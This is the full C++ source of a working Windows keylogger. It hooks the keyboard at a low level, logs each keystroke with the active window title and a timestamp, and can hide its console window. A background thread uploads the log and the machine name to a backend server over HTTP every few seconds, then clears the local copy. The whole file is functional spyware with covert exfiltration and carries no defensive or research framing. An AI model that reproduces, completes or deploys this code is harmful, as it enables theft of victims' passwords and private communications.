#define UNICODE
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>
#include <string>
#include <thread>
#include <chrono>   
#include <vector>
#include <sstream>
#include <fstream>
#include "json.hpp"
#include <mutex>
#include <cstdio>

using json = nlohmann::json;
using namespace std;

// Configurations
#define FORMAT 0        // 0 = labels, 10 = decimal, 16 = hex
#define VISIBLE       // INVISIBLE or VISIBLE
#define BOOT_WAIT       // BOOT_WAIT or NOWAIT
#define MOUSE_IGNORE    // ignore mouse clicks

const char* serverName = "127.0.0.1";
const char* resource = "/";
const int intervalMinutes = 1;  // Every 1 minute
const string log_file_name = "keylogger.log";
const int BACKEND_PORT = 8000;

#if FORMAT == 0
const map<int, string> keyLabels{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"}, {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"}, {VK_MENU, "[ALT]"}, {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"}, {VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"},
    {VK_HOME, "[HOME]"}, {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}, {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}, {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}, {VK_ADD, "+"},
    {VK_SUBTRACT, "-"}, {VK_CAPITAL, "[CAPSLOCK]"}
};
#endif

class Keylogger {
private:
    HHOOK hookHandle;
    ofstream logFile;
    char lastWindow[256]{};

public:
    Keylogger(const string& filename) {
        logFile.open(filename, ios_base::app);
        hookHandle = nullptr;
        memset(lastWindow, 0, sizeof(lastWindow));
    }

    ~Keylogger() {
        RemoveHook();
        if (logFile.is_open()) logFile.close();
    }

    void InstallHook() {
        hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, nullptr, 0);
        if (!hookHandle) {
            MessageBox(nullptr, L"Failed to install hook!", L"Error", MB_ICONERROR);
        }
    }

    void RemoveHook() {
        if (hookHandle) {
            UnhookWindowsHookEx(hookHandle);
            hookHandle = nullptr;
        }
    }

    void Run() {
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {}
    }

    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbData = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            GetInstance().LogKeystroke(kbData->vkCode);
        }
        return CallNextHookEx(GetInstance().hookHandle, nCode, wParam, lParam);
    }

    void LogKeystroke(int vkCode) {
#ifdef MOUSE_IGNORE
    if (vkCode == 1 || vkCode == 2) return;
#endif

    HWND activeWindow = GetForegroundWindow();
    DWORD threadId = 0;
    HKL keyboardLayout = nullptr;

    char windowTitle[256] = "Unknown";

    if (activeWindow) {
        threadId = GetWindowThreadProcessId(activeWindow, nullptr);
        keyboardLayout = GetKeyboardLayout(threadId);
        GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
    }

    // Map key code to readable label or char
    stringstream keyLabel;
#if FORMAT == 10
    keyLabel << vkCode;
#elif FORMAT == 16
    keyLabel << hex << vkCode;
#else
    if (keyLabels.count(vkCode)) {
        keyLabel << keyLabels.at(vkCode);
    } else {
        char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR, keyboardLayout);
        bool isLowercase = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (GetKeyState(VK_SHIFT) & 0x8000) isLowercase = !isLowercase;
        if (!isLowercase) ch = tolower(ch);
        keyLabel << ch;
    }
#endif

    // Timestamp
    time_t t = time(nullptr);
    struct tm timeInfo;
    localtime_s(&timeInfo, &t);

    char timeStr[64];
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%dT%H:%M:%S%z", &timeInfo);

    // Build JSON log entry using nlohmann::json
    json logEntry = {
        {"timestamp", std::string(timeStr)},
        {"key", keyLabel.str()},
        {"window", std::string(windowTitle)}
    };

    // Write to log as a single line
    logFile << logEntry.dump() << "\n";
    logFile.flush();
}


    static void SetConsoleVisibility() {
#ifdef INVISIBLE
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE);
        FreeConsole();
#endif
#ifdef VISIBLE
        ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_SHOW);
#endif
    }

    static bool IsSystemBooting() {
        // Replace with better check if needed
        return false;
    }

    static Keylogger& GetInstance() {
        static Keylogger instance("keylogger.log");
        return instance;
    }
};

string getUserName(){
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    
    if (GetComputerNameA(computerName, &size)) {
        return computerName;
        // cout << "Computer Name: " << computerName << std::endl;
    } 
    return ""; 
}

std::mutex log_mutex; // For thread safety

// Utility: Safely open a file for reading
bool safeOpenFile(const std::string& filename, std::ifstream& file) {
    file.open(filename);
    if (!file.is_open()) {
        std::cerr << "[ERROR] Failed to open file: " << filename << std::endl;
        return false;
    }
    return true;
}

// Utility: Backup a corrupted log file
void backupCorruptedLog(const std::string& filename) {
    std::string backupName = filename + ".bak";
    std::remove(backupName.c_str());
    std::rename(filename.c_str(), backupName.c_str());
    std::cerr << "[WARN] Log file backed up as: " << backupName << std::endl;
}

// Robust JSON log loader
json getLogsAsJsonArray(const std::string& filename) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::ifstream logFile;
    if (!safeOpenFile(filename, logFile)) return json::array();
    std::string line;
    json logs = json::array();
    int lineNum = 0;
    while (getline(logFile, line)) {
        ++lineNum;
        if (!line.empty()) {
            try {
                logs.push_back(json::parse(line));
            } catch (const std::exception& e) {
                std::cerr << "[ERROR] JSON parse error at line " << lineNum << ": " << e.what() << std::endl;
                // Backup and clear corrupted log
                backupCorruptedLog(filename);
                break;
            }
        }
    }
    return logs;
}

// Function to send logs to backend, only flushes on confirmed success
void sendLogsToBackend() {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::ifstream logFile(log_file_name);
    if (!logFile.is_open()) {
        std::cerr << "[ERROR] Failed to open log file for upload.\n";
        return;
    }
    // Extract logs
    std::string logs((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
    logFile.close();
    if (logs.empty()) {
        std::cout << "[INFO] Log file is empty. Skipping upload.\n";
        return;
    }
    std::string hostname = getUserName();
    HINTERNET hSession = InternetOpenA("LogUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) {
        std::cerr << "[ERROR] Failed to open Internet session.\n";
        return;
    }
    HINTERNET hConnect = InternetConnectA(hSession, serverName, BACKEND_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "[ERROR] Failed to connect to server.\n";
        InternetCloseHandle(hSession);
        return;
    }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        std::cerr << "[ERROR] Failed to open HTTP request.\n";
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return;
    }
    std::string logsJson = getLogsAsJsonArray(log_file_name).dump();
    std::string body = "{\"logs\":" + logsJson + ",\"hostname\":\"" + hostname + "\"}";
    std::string headers = "Content-Type: application/json\r\n";
    BOOL bRequestSent = HttpSendRequestA(
        hRequest,
        headers.c_str(),
        headers.length(),
        (LPVOID)body.c_str(),
        body.size()
    );
    if (!bRequestSent) {
        std::cerr << "[ERROR] Failed to send HTTP request.\n";
    } else {
        char responseBuffer[4096] = { 0 };
        DWORD bytesRead = 0;
        BOOL bRead = InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead);
        if (bRead && bytesRead > 0) {
            responseBuffer[bytesRead] = '\0';
            std::string response(responseBuffer);
            response.erase(0, response.find_first_not_of(" \t\n\r"));
            response.erase(response.find_last_not_of(" \t\n\r") + 1);
            if (response == "{\"success\":true}") {
                std::ofstream clearFile(log_file_name, std::ios::out | std::ios::trunc);
                clearFile.close();
                std::cout << "[INFO] Logs cleared after successful upload.\n";
            } else {
                std::cerr << "[ERROR] Upload failed. Server response not {\"success\":true}.\n";
            }
        } else {
            std::cerr << "[ERROR] Failed to read server response.\n";
        }
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

// Background worker that runs every X minutes, with error handling
void scheduleBackendCalls(int intervalSeconds) {
    while (true) {
        try {
            sendLogsToBackend();
        } catch (const std::exception& e) {
            std::cerr << "[FATAL] Exception in sendLogsToBackend: " << e.what() << std::endl;
        }
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
    }
}

int main() {
    string compName = getUserName();
    cout<<compName;
    
    // Start the backend call thread (runs every 10 seconds for demo)
    std::thread schedulerThread(scheduleBackendCalls, 10);
    schedulerThread.detach(); // Run it independently

    Keylogger::SetConsoleVisibility();

#ifdef BOOT_WAIT
    while (Keylogger::IsSystemBooting()) {
        Sleep(10000);
    }
#endif

    Keylogger& logger = Keylogger::GetInstance();
    logger.InstallHook();
    logger.Run();
}
